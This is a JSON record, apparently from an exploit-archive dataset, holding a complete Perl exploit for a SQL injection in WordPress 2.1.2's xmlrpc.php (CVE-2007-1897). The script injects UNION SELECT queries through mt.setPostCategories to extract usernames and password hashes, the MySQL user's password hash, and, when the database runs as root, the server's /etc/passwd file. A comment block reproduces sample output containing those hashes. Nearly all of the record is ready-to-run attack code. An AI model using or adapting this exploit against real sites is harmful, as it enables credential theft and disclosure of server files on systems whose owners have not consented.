{
  "id": "3656",
  "title": "WordPress Core 2.1.2 - &#039;xmlrpc&#039; SQL Injection",
  "cve": "CVE-2007-1897",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n\r\n\r\n\r\n#Wordpress 2.1.2 SQL Injection POC\r\n#Credits: sid@notsosecure.com\r\n#Thanks to ferruh (ferruh@mavituna.com)for improving my exploitation skills\r\n#website:www.notsosecure.com\r\n\r\n#Wordpress version 2.1.2 is vulnerable to sql injection. This POC works when exploting with the credentials of a valid user. The user can belong to 'contributor' role or any higher role. Versions before 2.1.2 have not been tested but are most likely to be vulnerable as well. \r\n\r\n#Example:---------------------------------------------------------------------------------------\r\n#C:\\wp-xmlrpc-2-2-sql.pl\" http://192.168.2.4/apache2-default/wordpress/ author author 5\r\n#\r\n# The usage is correct\r\n#[*] Trying Host http://192.168.2.4/apache2-default/wordpress/ ...\r\n#[+] The xmlrpc-2-2 server seems to be working\r\n#--------------------\r\n#Username for id = 1 is:--> admin\r\n#\r\n#Md5 hash for user: admin\r\n#\r\n#is: 21232f297a57a5a743894a0e4a801fc3\r\n#\r\n#--------------------\r\n#Username for id = 2 is:--> contri\r\n#\r\n#Md5 hash for user: contri\r\n#\r\n#is: 95a178dde9d3fa2bde4971f10d3acc3e\r\n#\r\n#--------------------\r\n#Username for id = 3 is:--> author\r\n#\r\n#Md5 hash for user: author\r\n#\r\n#is: 02bd92faa38aaa6cc0ea75e59937a1ef\r\n#\r\n#-----------------------\r\n#Total Number of Users found:-->3\r\n#-----------------------\r\n#Mysql is running as:  root@localhost\r\n#\r\n#Encrypted password for: root@localhost\r\n# is: root@localhost67457e226a1a15bd\r\n#\r\n#This deserves no mercy.... Lets get the /etc/passwd\r\n#.......imho...Here is the /etc/passwd file:\r\n#root:x:0:0:root:/root:/bin/bash\r\n#daemon:x:1:1:daemon:/usr/sbin:/bin/sh\r\n#bin:x:2:2:bin:/bin:/bin/sh\r\n#sys:x:3:3:sys:/dev:/bin/sh\r\n#sync:x:4:65534:sync:/bin:/bin/sync\r\n#games:x:5:60:games:/usr/games:/bin/sh\r\n#man:x:6:12:man:/var/cache/man:/bin/sh\r\n#lp:x:7:7:lp:/var/spool/lpd:/bin/sh\r\n#mail:x:8:8:mail:/var/mail:/bin/sh\r\n#news:x:9:9:news:/var/spool/news:/bin/sh\r\n#uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\r\n#proxy:x:13:13:proxy:/bin:/bin/sh\r\n#www-data:x:33:33:www-data:/var/www:/bin/sh\r\n#backup:x:34:34:backup:/var/backups:/bin/sh\r\n#list:x:38:38:Mailing List Manager:/var/list:/bin/sh\r\n#gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\r\n#messagebus:x:100:103::/var/run/dbus:/bin/false\r\n#postgres:x:101:105:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\r\n#haldaemon:x:103:109:Hardware abstraction layer,,,:/home/haldaemon:/bin/false\r\n#gdm:x:104:112:Gnome Display Manager:/var/lib/gdm:/bin/false\r\n#mysql:x:105:113:MySQL Server,,,:/var/lib/mysql:/bin/false\r\n#sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin\r\n#snort:x:107:115:Snort IDS:/var/log/snort:/bin/false\r\n#postfix:x:108:116::/var/spool/postfix:/bin/false\r\n#stunnel4:x:109:118::/var/run/stunnel4:/bin/false\r\n#arpwatch:x:111:120:ARP Watcher,,,:/var/lib/arpwatch:/bin/sh\r\n#statd:x:112:65534::/var/lib/nfs:/bin/false\r\n#sfs:x:113:121::/var/lib/sfs:/bin/false\r\n#ftp:x:114:65534::/home/ftp:/bin/false\r\n#Debian-exim:x:115:122::/var/spool/exim4:/bin/false\r\n#telnetd:x:116:123::/nonexistent:/bin/false\r\n#-------------------------------------------------------------------------------------------------------\r\n#use warnings;\r\nuse LWP::UserAgent;\r\nmy $ua = new LWP::UserAgent;\r\n$ua->agent(\"Wordpress Hash Grabber v2.0\" . $ua->agent);\r\n\r\n\r\nmy $host = $ARGV[0]; # The path to xmlrpc.php\r\nmy $username= $ARGV[1];#username <any role>\r\nmy $password= $ARGV[2];#password <any role>\r\nmy $postid=  $ARGV[3];#post id which the user can edit\r\nmy $pref = 'wp_';    # database prefix!\r\nmy $hash_pass=\"\";\r\n\r\n#$root='root@localhost.com';\r\n\r\n\r\nif (@ARGV < 4)\r\n{\r\nprint \" -----------------------------------------------------------------------\\n\";\r\nprint \" wp-xmlrpc-sql.pl - Wordpress xmlrpc.php 'post_id' sql injection exploit\\n Version 2.1.2\";\r\nprint \" by NotSoSecure // www.notsosecure.com \\n\";\r\nprint \" coded by sid //sid\\@notsosecure.com  // 31.03.2007\\n\";\r\nprint \" ------------------------------------------------------------------------\\n\";\r\nprint \" Usage:\\n\";\r\nprint \" wp-xmlrpc-sql.pl <host> <username> <password> <post_id>\\n\";\r\nprint \"\\n\";\r\nprint \" <host> - host for attack\\n full path eg. http://192.168.1.4/wordpress/\";\r\nprint \" <username> - valid username, can be in any of these role: contributor, author, editor \\n\";\r\nprint \" <password> - valid password for the user\\n\";\r\nprint \" <post_id> - valid post_id which the user can edit\\n\";\r\nprint \" ------------------------------------------------------------------------\\n\";\r\nexit();\r\n}\r\n\r\nprint \"\\n The usage is correct\\n[*] Trying Host $host ...\\n\";\r\n\r\nmy $res = $ua->get($host.'/xmlrpc.php');\r\n\r\nif ( $res->content =~ /XML-RPC server accepts POST requests only/is )\r\n{\r\n       print \"[+] The xmlrpc server seems to be working \\n\";\r\n}\r\nelse\r\n{\r\n\tprint \"--------------------\\n\";\r\n       print \"[error]--> Something seems to be wrong with the xmlrpc.php \\nCheck the full path to xmlrpc.php again\\n \";\r\n       # Sloppy way of debugging, remove if you want\r\n       open(LOG, \">wp_out.html\"); print LOG $res->content;\r\n       exit;\r\n}\r\n\r\nfor ($i=1; $i<=100 ;$i++)\r\n\t{\r\n\r\n#bug: if a user has been deleted the corresponding id will be missing.\r\n#change this to point to the known ids or the usernames, or just make it go for top 100 ids\r\n\r\n\t\t\t\t\t\t\t   #obtaining usernames and userid\r\n\t\t\t\t\t\t\t   my $sql = \"<?xml version=\\\"1.0\\\"?><methodCall><methodName>mt.setPostCategories</methodName>   <params>   <param><value><string>\".$postid.\" union all select user_login from wp_users where id=\".$i.\"</string></value>   </param>   <param><value><string>\".$username.\"</string></value>   </param>   <param><value><string>\".$password.\"</string></value>   </param>   <param><value>  <array>    <data><value>  <struct>    <member>      <name>categoryId</name>      <value><string>1</string></value>    </member>    <member>      <name>categoryName</name>      <value><string>Uncategorized</string></value>    </member>    <member>      <name>isPrimary</name>      <value><boolean>0</boolean></value>    </member>  </struct></value>  </data></array></value>   </param>   </params></methodCall>\";\r\n                               my $req = new HTTP::Request POST => $host . \"/xmlrpc.php\";\r\n                                  $req->content($sql);\r\n                                  $res = $ua->request($req);\r\n                              $out = $res->content;\r\n\r\n\t\r\nif($out=~ /Bad login\\/pass combination/)\r\n\t\t{\r\n\tprint \"--------------------\\n\";\r\n\tprint \"[error]-->Invalid username/password conbination\\n\";\r\n\r\n\texit;\r\n\t}\r\n\r\nif($out=~ /Sorry, you can not edit this post/)\r\n\t\t{\r\n\tprint \"--------------------\\n\";\r\n\tprint \"[error]-->INVALID postid \\n Supply a post id which can be edited by this user.\\n\";\r\n\r\n\texit;\r\n\t}\r\n\r\n\r\n\r\n\t\t\t\tif ($out =~ /DELETE FROM wp_post2cat/) \r\n\t\t\t\t\t{\r\n\r\n\t\t\t\t\t#print \"found\";\r\n\t\t\t\t\tprint \"--------------------\\n\";\r\n\t\r\n\t\t\t\t\t@result2=split(/category_id =/,$out);\r\n\t\t\t\t\t\r\n\t\t\t\t\t#to do: remove the assumption that username is less than 10 char \r\n\t\t\t\t\t$final=substr($result2[1],1,10);\r\n\t\t\t\t\t\r\n\t\t\t\t\t print \"Username for id = \".$i.\" is:--> \".$final.\"\\n\";\r\n\t\t\t\t\tno warnings;\r\n\t\t\t\t\t#obtaining md5 hash for the username\r\n\t\t\t\t\t\t\tmy $sql2 = \"<?xml version=\\\"1.0\\\"?><methodCall><methodName>mt.setPostCategories</methodName>   <params>   <param><value><string>\".$postid.\" union all select user_pass from wp_users where id=\".$i.\"</string></value>   </param>   <param><value><string>\".$username.\"</string></value>   </param>   <param><value><string>\".$password.\"</string></value>   </param>   <param><value>  <array>    <data><value>  <struct>    <member>      <name>categoryId</name>      <value><string>1</string></value>    </member>    <member>      <name>categoryName</name>      <value><string>Uncategorized</string></value>    </member>    <member>      <name>isPrimary</name>      <value><boolean>0</boolean></value>    </member>  </struct></value>  </data></array></value>   </param>   </params></methodCall>\";\r\n                               my $req2 = new HTTP::Request POST => $host . \"/xmlrpc.php\";\r\n                                  $req2->content($sql2);\r\n                                  $res2 = $ua->request($req2);\r\n                              $out2 = $res2->content;\r\n\r\n\r\n\t\t\t\t\t@result3=split(/category_id =/,$out2);\r\n\t\t\t\t\t\r\n\t\t\t\t\t$hash=substr($result3[1],1,33);\r\n\t\t\t\t\tprint \"Md5 hash for user: \".$final.\" \\nis: \".$hash.\"\\n\";\r\n\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse \r\n\t\t\t\t\t{\t\r\n\t\t\t\t\t\tprint \"-----------------------\\n\";\r\n\t\t\t\t\t\tprint \"Total Number of Users found:-->\".($i-1).\"\\n\";\r\n\r\n\t\t\t\t\t\tprint \"-----------------------\\n\";\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t#lets find wat the db is running as:\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tmy $sql2 = \"<?xml version=\\\"1.0\\\"?><methodCall><methodName>mt.setPostCategories</methodName>   <params>   <param><value><string>\".$postid.\" union all select user()</string></value>   </param>   <param><value><string>\".$username.\"</string></value>   </param>   <param><value><string>\".$password.\"</string></value>   </param>   <param><value>  <array>    <data><value>  <struct>    <member>      <name>categoryId</name>      <value><string>1</string></value>    </member>    <member>      <name>categoryName</name>      <value><string>Uncategorized</string></value>    </member>    <member>      <name>isPrimary</name>      <value><boolean>0</boolean></value>    </member>  </struct></value>  </data></array></value>   </param>   </params></methodCall>\";\r\n                               my $req2 = new HTTP::Request POST => $host . \"/xmlrpc.php\";\r\n                                  $req2->content($sql2);\r\n                                  $res2 = $ua->request($req2);\r\n                              $out2 = $res2->content;\r\n\r\n\r\n\t\t\t\t\t@result3=split(/category_id =/,$out2);\r\n\t\t\t\t\t\r\n\t\t\t\t\t$hash_user=substr($result3[1],1,20);\r\n\t\t\t\t\tprint \"Mysql is running as:  \".$hash_user.\"\\n\";\r\n\r\n\t\t\t\t\t#lets get the password hash of the db_user for offline cracking\r\n\t\t\t\t\t#buggy code\r\n\t\t\t\t\tmy $sql3 = \"<?xml version=\\\"1.0\\\"?><methodCall><methodName>mt.setPostCategories</methodName>   <params>   <param><value><string>\".$postid.\" union all select  concat(user(),mysql.user.Password) from mysql.user where user=user()</string></value>   </param>   <param><value><string>\".$username.\"</string></value>   </param>   <param><value><string>\".$password.\"</string></value>   </param>   <param><value>  <array>    <data><value>  <struct>    <member>      <name>categoryId</name>      <value><string>1</string></value>    </member>    <member>      <name>categoryName</name>      <value><string>Uncategorized</string></value>    </member>    <member>      <name>isPrimary</name>      <value><boolean>0</boolean></value>    </member>  </struct></value>  </data></array></value>   </param>   </params></methodCall>\";\r\n                               my $req3 = new HTTP::Request POST => $host . \"/xmlrpc.php\";\r\n                                  $req3->content($sql3);\r\n                                  $res3 = $ua->request($req3);\r\n                              $out3 = $res3->content;\r\n\t\t\t\t\tmy $hash_pass=\"\";\r\n\t\t\t\t\t#print $out3;\r\n\t\t\t\t\tif ($out3=~m/SELECT command denied to user/) {\r\n\t\t\t\t\tprint \"Cant get the password for this user, \\nPermission Denied, Thats better security!!\";\r\n\t\t\t\t\texit;}\t\r\n\t\t\t\t\telse{\r\n\t\t\t\t\t\t\t\t\t\t@result3=split(/category_id =/,$out3);\r\n\t\t\t\t\t\t\t\t\t\t$hash_pass=substr($result3[1],1,30);\r\n\t\t\t\t\t\t\t\t\t\tprint $hash_pass;\r\nif ($hash_pass eq \"\") {\r\n\tprint \"No Password set\";\r\n}\r\nelse{\r\n\t\t\t\t\tprint \"Encrypted password for: \".$hash_user.\"\\n is \".$hash_pass.\"\\n\";\r\n}\t\t\t\t#IF database is running as root, lets rip it apart\r\n\t\t\t\t\t\r\n\t\t\t\t\tif ($hash_user =~m/root/) {\r\n\t\t\t\t\t\tprint\"\\nThis deserves no mercy....\\n Lets get the /etc/passwd\\n.......imho...\\n\\n\";\r\n\r\n\r\n\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t\t\tmy $sql4 = \"<?xml version=\\\"1.0\\\"?><methodCall><methodName>mt.setPostCategories</methodName>   <params>   <param><value><string>\".$postid.\" union all select load_file(0x2f6574632f706173737764)</string></value>   </param>   <param><value><string>\".$username.\"</string></value>   </param>   <param><value><string>\".$password.\"</string></value>   </param>   <param><value>  <array>    <data><value>  <struct>    <member>      <name>categoryId</name>      <value><string>1</string></value>    </member>    <member>      <name>categoryName</name>      <value><string>Uncategorized</string></value>    </member>    <member>      <name>isPrimary</name>      <value><boolean>0</boolean></value>    </member>  </struct></value>  </data></array></value>   </param>   </params></methodCall>\";\r\n                               my $req2 = new HTTP::Request POST => $host . \"/xmlrpc.php\";\r\n                                  $req2->content($sql4);\r\n                                  $res2 = $ua->request($req2);\r\n                              $out2 = $res2->content;\r\n\t\t\t\t\t\r\n\t\t\t\t\t\r\n\t\t\t\t\t@result3=split(/category_id =/,$out2);\r\n\t\t\t\t\t\r\n\t\t\t\t\t$hash=substr($result3[1],1,1600);\r\n\r\n\t\t\t\t\tprint \"Here is the /etc/passwd file:\\n\\n\\n\";\r\n\t\t\t\t\tprint $hash;\r\n\t\t\t\t\t}\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\texit;\r\n\r\n\r\n\t\t\t\t\t}\r\n\r\n\r\n\r\n\r\n\r\n\r\n\t\t\t\t\t}\t\t\r\n\t\t\t\t\t\t\t\t\r\n\t}\r\n\r\n# milw0rm.com [2007-04-03]",
  "url": "https://www.exploit-db.com/exploits/3656"
}